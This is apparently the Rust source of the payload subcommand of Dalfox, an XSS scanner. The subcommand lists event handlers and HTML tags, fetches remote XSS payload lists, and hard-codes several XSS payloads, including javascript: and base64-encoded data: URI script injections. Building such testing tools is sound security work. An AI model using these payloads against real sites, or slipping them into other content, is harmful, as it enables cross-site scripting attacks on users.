use clap::Args;

use crate::cmd::scan::ScanOutcome;

const KNOWN_SELECTORS: &[&str] = &[
    "event-handlers",
    "useful-tags",
    "payloadbox",
    "portswigger",
    "uri-scheme",
];

/// Manage or inspect payloads (no local flags).
///
/// Note:
/// - The legacy enum-* flags have been removed.
/// - This subcommand currently provides a brief summary only.
/// - Payload selection and application is handled by the scanning engine.
#[derive(Args, Debug, Clone)]
#[command(
    about = "Manage or inspect payloads",
    long_about = "Selectors:\n  - event-handlers: list all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: list useful HTML tag names often used in XSS contexts (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)"
)]
pub struct PayloadArgs {
    #[arg(
        value_name = "SELECTOR",
        help = "Payload selector\nAvailable selectors:\n  - event-handlers\n  - useful-tags\n  - payloadbox\n  - portswigger\n  - uri-scheme",
        long_help = "Selector to enumerate payload resources.\nSupported selectors:\n  - event-handlers: print all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: print useful HTML tag names used for XSS payloads (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)"
    )]
    pub selector: Option<String>,
}

fn uri_scheme_payloads() -> &'static [&'static str] {
    &[
        "javascript:alert(1)",
        "data:text/html;,<svg/onload=alert(1)>",
        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNDUpPg==",
        "data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sJz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg==",
        "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4=",
    ]
}

fn print_summary() {
    let js_count = crate::payload::XSS_JAVASCRIPT_PAYLOADS.len();

    println!("Dalfox payload");
    println!("----------------");
    println!("Provide a selector to list payloads. Examples:");
    println!("  dalfox payload event-handlers");
    println!("  dalfox payload useful-tags");
    println!("  dalfox payload payloadbox");
    println!("  dalfox payload portswigger");
    println!("  dalfox payload uri-scheme\n");

    println!("Summary:");
    println!("- Canonical JavaScript payloads: {}", js_count);

    println!("\nTips:");
    println!("- Use scanning to apply payloads: dalfox scan <target>");
    println!("- Add your own payloads with: --custom-payload <file>");
    println!("- Only test custom payloads with: --only-custom-payload");
    println!(
        "- Control encoder variants with: -e none,url,2url,3url,4url,html,htmlpad,base64,unicode,zwsp"
    );
}

/// Fetch payloads from a remote provider and print one per line.
/// Returns `true` when initialization (and any printing) finished without an
/// error path being taken; `false` on runtime build failure, fetch failure,
/// or an uninitialized cache. Callers translate this into the CLI exit code.
fn fetch_and_print_remote(provider: &str) -> bool {
    let provider = provider.to_string();
    let ok = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let ok_clone = ok.clone();
    let join = std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build();
        match rt {
            Ok(rt) => {
                rt.block_on(async move {
                    let providers = vec![provider.clone()];
                    if let Err(e) = crate::utils::init_remote_resources(&providers, &[]).await {
                        eprintln!("[payload] failed to fetch from {}: {}", provider, e);
                        return;
                    }
                    if let Some(list) = crate::utils::get_remote_payloads() {
                        let count = list.len();
                        for p in list.iter() {
                            println!("{}", p);
                        }
                        crate::dbg_log!("{}: {} payloads", provider, count);
                        ok_clone.store(true, std::sync::atomic::Ordering::Relaxed);
                    } else {
                        eprintln!(
                            "[payload] no payloads initialized for provider {}",
                            provider
                        );
                    }
                });
            }
            Err(e) => {
                eprintln!("[payload] runtime init error: {}", e);
            }
        }
    });
    // A worker-thread panic is exceptional but should not be silently dropped.
    if let Err(e) = join.join() {
        eprintln!("[payload] fetch worker panicked: {:?}", e);
        return false;
    }
    ok.load(std::sync::atomic::Ordering::Relaxed)
}

pub fn run_payload(args: PayloadArgs) -> ScanOutcome {
    match args.selector.as_deref() {
        Some("event-handlers") => {
            let list = crate::payload::xss_event::common_event_handler_names();
            for ev in list.iter() {
                println!("{}", ev);
            }
            crate::dbg_log!("event-handlers: {} items", list.len());
            ScanOutcome::Clean
        }
        Some("useful-tags") => {
            let list = crate::payload::xss_html::useful_html_tag_names();
            for t in list.iter() {
                println!("{}", t);
            }
            crate::dbg_log!("useful-tags: {} items", list.len());
            ScanOutcome::Clean
        }
        Some("payloadbox") => {
            if fetch_and_print_remote("payloadbox") {
                ScanOutcome::Clean
            } else {
                ScanOutcome::Error
            }
        }
        Some("portswigger") => {
            if fetch_and_print_remote("portswigger") {
                ScanOutcome::Clean
            } else {
                ScanOutcome::Error
            }
        }
        Some("uri-scheme") => {
            let list = uri_scheme_payloads();
            for payload in list {
                println!("{}", payload);
            }
            crate::dbg_log!("uri-scheme: {} payloads", list.len());
            ScanOutcome::Clean
        }
        Some(other) => {
            eprintln!("Unknown selector: {}", other);
            eprintln!("Available selectors: {}", KNOWN_SELECTORS.join(", "));
            ScanOutcome::Error
        }
        None => {
            // Provide a small, helpful summary rather than a no-op.
            print_summary();
            ScanOutcome::Clean
        }
    }
}

#[cfg(test)]
mod tests;
